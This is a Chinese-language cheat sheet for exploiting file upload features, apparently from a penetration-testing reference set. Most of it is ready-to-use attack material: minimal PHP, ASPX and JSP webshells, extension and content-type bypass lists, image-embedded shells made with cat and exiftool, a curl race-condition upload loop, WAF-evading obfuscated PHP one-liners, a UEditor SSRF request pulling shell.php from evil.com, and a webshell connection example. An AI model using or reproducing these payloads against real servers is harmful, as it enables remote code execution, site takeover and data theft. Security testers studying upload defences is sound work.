# 文件上传漏洞实战参考
- 上传 Webshell 后的命令执行 → `web-rce.md`
- WAF 绕过上传 Payload → `web-waf-bypass.md`

> 分类: 检测 → 后缀绕过 → 内容绕过 → 条件竞争 → 图片马 → 解析漏洞 → 客户端绕过 → WAF绕过

> **last_updated**: 2026-06-04 | **tested_against**: Apache 2.4, Nginx 1.24, PHP 8.x, IIS 10
---

## 1. 快速检测

### 1.1 基础检测步骤

```
1. 正常上传一张图片，确认上传成功的响应/路径
2. 上传 PHP 文件 → 被拦截? 错误提示是什么?
3. 根据错误提示判断是: 前端校验 | 后缀黑名单 | 内容校验 | WAF拦截
```

### 1.2 测试用的最小 Webshell

```php
# PHP 一句话 (最小)
<?php @eval($_POST[1]);?>

# 更短
<?=system($_GET[1]);?>

# ASPX
<%@Page Language="C#"%><%System.Web.HttpContext.Current.Response.Write(System.Diagnostics.Process.Start("cmd","/c"+System.Web.HttpContext.Current.Request["cmd"]).StandardOutput.ReadToEnd());%>

# JSP (最小)
<%Runtime.getRuntime().exec(request.getParameter("c"));%>
```

---

## 2. 后缀绕过

### 2.1 黑名单后缀 — 尝试替代后缀

```php
# === PHP ===
.php   → .php5 / .phtml / .pht / .phar / .phps / .shtml / .php.jpg
.php   → .PhP / .PHP / .Php5                               # 大小写
.php   → .php. .php::$DATA .php....                         # Windows特性
.php   → .php%00.jpg (.jpg被截断, PHP <5.3.4)               # 空字节截断
.php   → .php/. (Apache 解析漏洞, CVE-2013-4547)

# === ASP/ASPX ===
.asp   → .aspx / .ashx / .asmx / .ascx / .asax
.asp   → .asp;.jpg (IIS6 解析漏洞, ; 后截断)
.asp   → .asp::$DATA (Windows NTFS流)

# === JSP ===
.jsp   → .jspx / .jspf / .jsw / .jsv
.jsp   → .Jsp / .JSP
.jsp   → .jsp%00.jpg (空字节截断)
```

### 2.2 白名单 — 组合利用

```bash
# 双重后缀 (Apache 按最后一个不认识的后缀解析)
shell.php.xxx     → 如果.xxx不在mime类型中 → PHP解析
shell.php.jpg     → 某些配置下仍被PHP解析

# 配合 .htaccess / web.config 覆盖解析规则
.htaccess 内容:   AddType application/x-httpd-php .jpg
web.config 内容:  <handlers><add name="php" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\php\php-cgi.exe" /></handlers>
```

---

## 3. 内容检测绕过

### 3.1 Content-Type 绕过

```
# 抓包改 Content-Type
Content-Type: application/x-php  →  image/jpeg
Content-Type: application/x-php  →  image/png
Content-Type: application/x-php  →  image/gif
```

### 3.2 文件幻数 (Magic Number) 绕过

```bash
# 在 Webshell 前添加幻数字节

# JPEG: FF D8 FF E0
# PNG:  89 50 4E 47
# GIF:  47 49 46 38 39 61  →  GIF89a
# BMP:  42 4D

# === PHP Webshell + GIF头 ===
GIF89a
<?php @eval($_POST[1]);?>

# === 直接生成 ===
echo 'GIF89a<?php @eval($_POST[1]);?>' > shell.gif

# === 十六进制编辑器操作 (或 copy /b) ===
# Windows:
copy /b real.jpg + shell.php shell.jpg

# Linux:
cat real.jpg shell.php > shell.jpg
```

### 3.3 getimagesize() 绕过

```php
# 需要文件是"真正"的图片才通过
# Photoshop 另存 → 在 EXIF Comment 处插入 PHP 代码
# 或用 exiftool:
exiftool -Comment='<?php @eval($_POST[1]);?>' image.jpg
# 把文件改名为 .php (配合解析漏洞)
```

---

## 4. 条件竞争

### 4.1 原理

```
1. 上传 shell.php → 服务器保存到 /tmp/ → 检查 → 不通过 → 删除
2. 在 "保存" 和 "删除" 之间短时间窗口访问 /tmp/shell.php
3. 多发并发请求 → 总有一次卡在窗口内
```

### 4.2 竞争工具

```bash
# === Python 条件竞争上传 ===
# Terminal 1: 快速上传
while true; do curl -s -F "file=@shell.php" "http://target.com/upload" & done

# Terminal 2: 快速访问 (猜测路径)
while true; do curl -s "http://target.com/uploads/shell.php" && break; done
```

```python
# Python 脚本 (concurrent 版本)
# 略，直接用 Burp Intruder (Null payloads + 高并发) 更方便
```

---

## 5. 图片马 + 解析漏洞

### 5.1 图片马制作

```bash
# === 生成图片马 ===
# 方式1: 直接拼接
cat normal.png shell.php > evil.png
mv evil.png evil.php.png   # 双后缀

# 方式2: exiftool
exiftool -Comment='<?php @eval($_POST[1]);?>' normal.png

# 方式3: 使用工具
jhead -ce normal.jpg   # 插入 PHP 注释 (含代码)
```

### 5.2 配合解析漏洞 (文件包含)

```
如果目标有文件包含漏洞:
http://target.com/page.php?file=uploads/evil.png
→ PHP 代码被执行
```

---

## 6. 客户端绕过

### 6.1 JavaScript 前端校验

```
# 绕过方法:
1. 抓包 → 改文件名 → 去掉 .js 拦截
2. 直接 POST (不用浏览器) curl
3. 禁用 JavaScript (F12 → 设置)
4. Burp Repeater 重放
```

### 6.2 客户端文件头校验

```javascript
// JS 读取文件前4字节判断类型
// 绕过: 在 Webshell 前加 GIF89a / PNG 头 → 后跟 PHP 代码
```

---

## 7. 常见上传组件漏洞

### 7.1 CKEditor / FCKEditor

```
FCKeditor < 2.6.4:
/FCKeditor/editor/filemanager/connectors/asp/connector.asp
→ 上传目录不可控? → 尝试目录遍历

CKFinder:
/ckfinder/ckfinder.html
→ 默认允许上传 .jpg, 配合 IIS6 解析漏洞 (.asp;.jpg)
```

### 7.2 UEditor

```
# UEditor 1.4.3.x (SSRF + 任意文件上传)
http://target.com/ueditor/php/controller.php?action=catchimage&source[]=http://evil.com/shell.php?.jpg
# source 参数可控 → SSRF + 上传
```

### 7.3 KindEditor

```
# KindEditor 目录遍历上传
/kindeditor/php/upload_json.php?dir=../../../
→ 上传到任意目录
```

---

## 8. WAF 绕过

### 8.1 文件名 WAF 绕过

```bash
# 多重扩展名
shell.jpg.php
shell.php.jpg

# 特殊字符
shell.php%00.jpg         # %00 截断
shell.php%0d%0a.jpg      # CRLF
shell.php::$DATA          # NTFS

# 超长文件名
AAAAAAAAAA....(2048个A)....AAAA.php   # 缓冲区溢出
```

### 8.2 内容 WAF 绕过

```php
# === PHP 一句话变形 ===
# 标准版
<?php @eval($_POST[1]);?>

# 变形1: 短标签
<?=@eval($_POST[1]);?>

# 变形2: 字符串拼接
<?php $a='ev'.'al';$a($_POST[1]);?>

# 变形3: 变量函数
<?php $a=base64_decode('ZXZhbA==');$a($_POST[1]);?>

# 变形4: 反序列化
<?php unserialize($_POST[1]);?>

# 变形5: 回调函数
<?php array_map('assert',array($_POST[1]));?>

# 变形6: 回调函数 (PHP 7.4以下)
<?php preg_replace('/./e',$_POST[1],'.');?>

# 变形7: 动态函数
<?php $f=$_POST['f'];$f($_POST['x']);?>
# POST: f=system&x=id
```

---

## 9. 上传后利用

### 9.1 找上传路径

```
1. 上传图片 → 右键"查看图片" → 看URL路径
2. 查看页面源码 → <img src="/uploads/xxx.jpg">
3. 枚举常见目录: /uploads/ /upload/ /images/ /files/ /temp/
4. 根据网站 CMS 判断默认路径
   WordPress: /wp-content/uploads/YYYY/MM/
   DedeCMS: /uploads/allimg/YYMMDD/
   Discuz: /data/attachment/forum/
```

### 9.2 Webshell 管理

```bash
# AntSword (蚁剑) — 支持 PHP/ASP/JSP
# Godzilla (哥斯拉) — 加密流量的 Webshell 管理
# Behinder (冰蝎) — 动态加密, 过WAF

# 一句话连接:
POST /shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
1=system('id');
```

---
## 相关参考
- 上传 Webshell 后的命令执行 → `web-rce.md`
- WAF 绕过上传 Payload → `web-waf-bypass.md`

*参考: OWASP File Upload + 实战案例 + PayloadAllTheThings*
